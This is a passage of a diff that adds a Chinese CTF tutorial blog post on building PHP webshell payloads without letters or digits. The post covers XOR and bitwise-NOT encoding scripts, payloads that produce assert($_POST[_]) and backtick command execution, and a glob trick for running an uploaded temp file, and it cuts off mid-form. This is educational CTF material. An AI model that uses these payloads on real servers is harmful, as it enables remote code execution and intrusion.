@@ -165,6 +165,205 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/12/21/%E6%B5%85%E6%9E%90CTF%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="zoey">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zoey">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/21/%E6%B5%85%E6%9E%90CTF%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell/" class="post-title-link" itemprop="url">浅析CTF绕过字符数字构造shell</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-21 22:54:11" itemprop="dateCreated datePublished" datetime="2020-12-21T22:54:11+08:00">2020-12-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-25 23:30:48" itemprop="dateModified" datetime="2021-03-25T23:30:48+08:00">2021-03-25</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为CTF中，虽然有很多文章有这方面的资料，但是相对来说比较零散，这里主要把自己学习和打ctf遇到的一些绕过字符数字构造shell梳理一下。</p>
+<p>无字母数字webshell简单来说就是payload中不能出现字母，数字（有些题目还有其他一些过滤），通过异或取反等方法取得flag。</p>
+<h3 id="测试源码"><a href="#测试源码" class="headerlink" title="测试源码"></a>测试源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果shell中不还有字母和数字，则可以执行eval语句</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><p>异或的符号是<code>^</code>,是一种运算符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 ^ 1 &#x3D; 0</span><br><span class="line">1 ^ 0 &#x3D; 1</span><br><span class="line">0 ^ 1 &#x3D; 1</span><br><span class="line">0 ^ 0 &#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<h4 id="异或脚本"><a href="#异或脚本" class="headerlink" title="异或脚本"></a>异或脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">128</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&quot;%s^%s&quot;</span>,urlencode(chr($i)),urlencode(chr(<span class="number">255</span>))).<span class="string">&quot;=&gt;&quot;</span>. (chr($i)^chr(<span class="number">255</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行该脚本我们知道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">%81^%FF&#x3D;&gt;~     %82^%FF&#x3D;&gt;&#125;       %83^%FF&#x3D;&gt;|</span><br><span class="line">%84^%FF&#x3D;&gt;&#123;     %85^%FF&#x3D;&gt;z       %86^%FF&#x3D;&gt;y</span><br><span class="line">%87^%FF&#x3D;&gt;x     %88^%FF&#x3D;&gt;w       %89^%FF&#x3D;&gt;v</span><br><span class="line">%8A^%FF&#x3D;&gt;u     %8B^%FF&#x3D;&gt;t       %8C^%FF&#x3D;&gt;s</span><br><span class="line">%8D^%FF&#x3D;&gt;r     %8E^%FF&#x3D;&gt;q       %8F^%FF&#x3D;&gt;p</span><br><span class="line">%90^%FF&#x3D;&gt;o     %91^%FF&#x3D;&gt;n       %92^%FF&#x3D;&gt;m</span><br><span class="line">%93^%FF&#x3D;&gt;l     %94^%FF&#x3D;&gt;k       %95^%FF&#x3D;&gt;j</span><br><span class="line">%96^%FF&#x3D;&gt;i     %97^%FF&#x3D;&gt;h       %98^%FF&#x3D;&gt;g</span><br><span class="line">%99^%FF&#x3D;&gt;f     %9A^%FF&#x3D;&gt;e       %9B^%FF&#x3D;&gt;d</span><br><span class="line">%9C^%FF&#x3D;&gt;c     %9D^%FF&#x3D;&gt;b       %9E^%FF&#x3D;&gt;a</span><br><span class="line">%9F^%FF&#x3D;&gt;&#96;     %A0^%FF&#x3D;&gt;_       %A1^%FF&#x3D;&gt;^</span><br><span class="line">%A2^%FF&#x3D;&gt;]     %A3^%FF&#x3D;&gt;\       %A4^%FF&#x3D;&gt;[</span><br><span class="line">%A5^%FF&#x3D;&gt;Z     %A6^%FF&#x3D;&gt;Y       %A7^%FF&#x3D;&gt;X</span><br><span class="line">%A8^%FF&#x3D;&gt;W     %A9^%FF&#x3D;&gt;V       %AA^%FF&#x3D;&gt;U</span><br><span class="line">%AB^%FF&#x3D;&gt;T     %AC^%FF&#x3D;&gt;S       %AD^%FF&#x3D;&gt;R    </span><br><span class="line">%AE^%FF&#x3D;&gt;Q     %AF^%FF&#x3D;&gt;P       %B0^%FF&#x3D;&gt;O</span><br><span class="line">%B1^%FF&#x3D;&gt;N     %B2^%FF&#x3D;&gt;M       %B3^%FF&#x3D;&gt;L</span><br><span class="line">%B4^%FF&#x3D;&gt;K     %B5^%FF&#x3D;&gt;J       %B6^%FF&#x3D;&gt;I</span><br><span class="line">%B7^%FF&#x3D;&gt;H     %B8^%FF&#x3D;&gt;G       %B9^%FF&#x3D;&gt;F</span><br><span class="line">%BA^%FF&#x3D;&gt;E     %BB^%FF&#x3D;&gt;D       %BC^%FF&#x3D;&gt;C</span><br><span class="line">%BD^%FF&#x3D;&gt;B     %BE^%FF&#x3D;&gt;A       %BF^%FF&#x3D;&gt;@</span><br><span class="line">%C0^%FF&#x3D;&gt;?</span><br></pre></td></tr></table></figure>
+
+<p>通过这种方法构造一个phpinfo()函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br><span class="line">我们知道，经过一次get传参会进行一次URL解码，所以我们可以将字符先进行url编码再进行异或得到我们想要的字符。 %A0^%FF=&gt;_ </span><br><span class="line">%B8^%FF=&gt;G</span><br><span class="line">%BA^%FF=&gt;E  </span><br><span class="line">%AB^%FF=&gt;T </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br><span class="line"><span class="comment">//输出_GET</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/1.png"></p>
+<h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>取反的符号是<code>~</code>，也是一种运算符。在数值的二进制表示方式上，将0变为1，将1变为0。</p>
+<p>直接看如何构造phpinfo()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/2.png" alt="取反"></p>
+<p>可以看出，自己对phpinfo取反，会产生一些不可见字符，可对phpinfo取反后再进行url编码。</p>
+<h4 id="取反脚本"><a href="#取反脚本" class="headerlink" title="取反脚本"></a>取反脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/3.png" alt="取反1"></p>
+<h3 id="构造assert字符"><a href="#构造assert字符" class="headerlink" title="构造assert字符"></a>构造assert字符</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">9</span>E^%FF=&gt;a</span><br><span class="line"> %<span class="number">8</span>C^%FF=&gt;s</span><br><span class="line"> %<span class="number">9</span>A^%FF=&gt;e</span><br><span class="line"> %<span class="number">8</span>D^%FF=&gt;r</span><br><span class="line"> %<span class="number">8</span>B^%FF=&gt;t</span><br><span class="line"> </span><br><span class="line">  %A0^%FF=&gt;_    </span><br><span class="line"> %AF^%FF=&gt;P </span><br><span class="line"> %B0^%FF=&gt;O</span><br><span class="line"> %AC^%FF=&gt;S</span><br><span class="line"> %AB^%FF=&gt;T </span><br><span class="line">    </span><br><span class="line">$_=<span class="string">&quot;%9E%8C%8C%9A%8D%8B&quot;</span>^<span class="string">&quot;%FF%FF%FF%FF%FF%FF&quot;</span>;</span><br><span class="line">$__=<span class="string">&quot;%A0%AF%B0%AC%AB&quot;</span>^<span class="string">&quot;%FF%FF%FF%FF%FF&quot;</span>;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/4.png" alt="取反2"></p>
+<h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p><strong>脚本</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shell = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">$result1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$result2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($num=<span class="number">0</span>;$num&lt;=strlen($shell);$num++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>($x=<span class="number">33</span>;$x&lt;<span class="number">126</span>;$x++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(judge(chr($x)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>($y=<span class="number">33</span>;$y&lt;=<span class="number">126</span>;$y++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(judge(chr($y)))</span><br><span class="line">                &#123;</span><br><span class="line">                    $f = chr($x)^chr($y);</span><br><span class="line">                    <span class="keyword">if</span>($f == $shell[$num])</span><br><span class="line">                    &#123;</span><br><span class="line">                        $result1 .= chr($x);</span><br><span class="line">                        $result2 .= chr($y);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $result1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $result2;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params">$c</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$c))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本可以将“assert”变成两个字符串异或的结果，通过更改shell的值可以构造出我们想要的字符串。为了便于表示，生成字符串的范围为33-126（可见字符）。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = <span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;   <span class="comment">//构造出assert</span></span><br><span class="line">$__ = <span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;   <span class="comment">//构造出_POST</span></span><br><span class="line">$___ = $$__;   <span class="comment">//$___ = $_POST</span></span><br><span class="line">$_($___[_]);   <span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell&#x3D;%24_+%3d+%22!((%25)(%22^%22%40[[%40[\\%22%3b%24__+%3d+%22!%2b%2f((%22^%22~&#123;&#96;&#123;|%22%3b%24___+%3d+%24%24__%3b%24_(%24___[_])%3b</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/5.png" alt="异或2"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_ &#x3D; &quot;!((%)(&quot;^&quot;@[[@[\\&quot;;</span><br><span class="line">$__ &#x3D; &quot;!+&#x2F;((&quot;^&quot;~&#123;&#96;&#123;|&quot;;  </span><br><span class="line">$___ &#x3D; $$__; </span><br><span class="line">$_($___[_]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/6.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%5f%3d%22%21%28%28%25%29%28%22%5e%22%40%5b%5b%40%5b%5c%5c%22%3b%24%5f%5f%3d%22%21%2b%2f%28%28%22%5e%22%7e%7b%60%7b%7c%22%3b%24%5f%5f%5f%3d%24%24%5f%5f%3b%24%5f%28%24%5f%5f%5f%5b%5f%5d%29%3b</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/7.png" alt="异或6"></p>
+<h4 id="第三种方法"><a href="#第三种方法" class="headerlink" title="第三种方法"></a>第三种方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"></span><br><span class="line">$b = urlencode(~<span class="string">&#x27;_POST&#x27;</span>);</span><br><span class="line"><span class="comment">//%A0%AF%B0%AC%AB</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_ = ~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;   <span class="comment">//得到assert，此时$_=&quot;assert&quot;</span></span><br><span class="line">$__ = ~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;   <span class="comment">//得到_POST，此时$__=&quot;_POST&quot;</span></span><br><span class="line">$___ = $$__;   <span class="comment">//$___=$_POST</span></span><br><span class="line">$_($___[_]);   <span class="comment">//assert($_POST[_])</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell=$_=~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;$__=~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/8.png" alt="取反3"></p>
+<h3 id="PHP5和7的区别"><a href="#PHP5和7的区别" class="headerlink" title="PHP5和7的区别"></a>PHP5和7的区别</h3><ul>
+<li><p>PHP5中，assert()是一个函数，我们可以用$<em>=assert;$</em>()这样的形式来执行代码。但在PHP7中，assert()变成了一个和eval()一样的语言结构，不再支持上面那种调用方法。但PHP7.0.12下还能这样调用。                  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/9.png" alt="13"></p>
+</li>
+</ul>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP  7.0.12</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/10.png" alt="14"></p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP7</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/11.png" alt="15"></p>
+<ul>
+<li><p>PHP5中，是不支持($a)()这种调用方法的，但在PHP7中支持这种调用方法，因此支持这么写(‘phpinfo’)();</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/12.png" alt="12"></p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 7</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/13.png" alt="11"></p>
+<h3 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了_"></a>过滤了_</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`&#123;$&#123;~<span class="string">&quot;%a0%b8%ba%ab&quot;</span>&#125;[%a0]&#125;`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析下这个Payload，?&gt;闭合了eval自带的&lt;?标签。接下来使用了短标签。{}包含的PHP代码可以被执行，~”%a0%b8%ba%ab”为”_GET”，通过反引号进行shell命令执行。最后我们只要GET传参%a0即可执行命令。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/14.png" alt="get"></p>
+<h3 id="过滤了-1"><a href="#过滤了-1" class="headerlink" title="过滤了$"></a>过滤了$</h3><h4 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h4><p>在PHP7中，我们可以使用($a)()这种方法来执行命令。所以可以用取反构造payload执行命令。(~%8F%97%8F%96%91%99%90)();执行phpinfo函数，第一个括号中可以是任意的表达式。但是这里不能用assert()来执行函数，因为php7不支持assert()函数。</p>
+<h4 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h4><p>在PHP5中不再支持($a)()方法来调用函数，在膜拜P神的<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">无字母数字webshell之提高篇</a>后，有了新的启发。如何在无字母，数字，$的系统命令下getshell？我们利用在Linux shell下两个知识点</p>
+<p>1，shell下可以利用<code>.</code>来执行任意脚本</p>
+<p>2，Linux文件名支持glob通配符代替</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/15.png" alt="16"></p>
+<p>从图可以看出，我们可以成功用<code>.</code>+文件名来执行文件，但是当使用通配符来执行文件时，系统会执行匹配到的第一个文件。</p>
+<p>在这两个条件下我们可以想到，如果我们可以上传一个文件，用<code>.</code>来执行这个文件就可以成功getshell。</p>
+<p>那么我们怎么上传文件呢？上传文件成功后文件又保存在哪里？怎么匹配执行？</p>
+<p>首先我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>,文件名最后6个字符是随机的大小写字母。</p>
+<p>现在我们可以利用glob通配符匹配该文件，我们知道</p>
+<p><code>*</code>可以代替0个及以上任意文件</p>
+<p><code>?</code>可以代表1个任意字符</p>
+<p><code>[^a]</code>可以用来判断这个位置的字符是不是a</p>
+<p><code>[0-9]</code>可以用来限制范围</p>
+<p>通过ascii码表我们知道，可见大写字母<code>@</code>与<code>[</code>之间，所以我们可以利用<code>[@-[]</code>来表示大写字母。</p>
+<p>综上，我们可以利用<code>. /???/????????[@-[]</code>来匹配<code>/tmp/phpXXXXXX</code></p>
+<h4 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;evil&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_GET[<span class="string">&#x27;evil&#x27;</span>])&gt;<span class="number">25</span>||preg_match(<span class="string">&quot;/[\w$=()&lt;&gt;&#x27;\&quot;]/&quot;</span>, $_GET[<span class="string">&#x27;evil&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;danger!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;evil&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过编写脚本看看哪些可见字符没有被过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">0</span>; $ascii &lt; <span class="number">256</span>; $ascii++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[\w$=()&lt;&gt;&#x27;\&quot;]/&quot;</span>, chr($ascii))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (chr($ascii));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/16.png" alt="17"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以发现过滤了字母，数字，&#96;$&#96;，&#96;_&#96;，&#96;()&#96;等，但&#96;和  .  还没有被过滤。由于过滤了（）所以不论PHP版本是5或者7，都不能执行($a)()，所以就没有必要去判断PHP版本。由此可以想到上传一个小马文件，然后用 &#96;  来执行文件。</span><br></pre></td></tr></table></figure>
+
+<p>首先，我们应该上传写一个表单上传</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 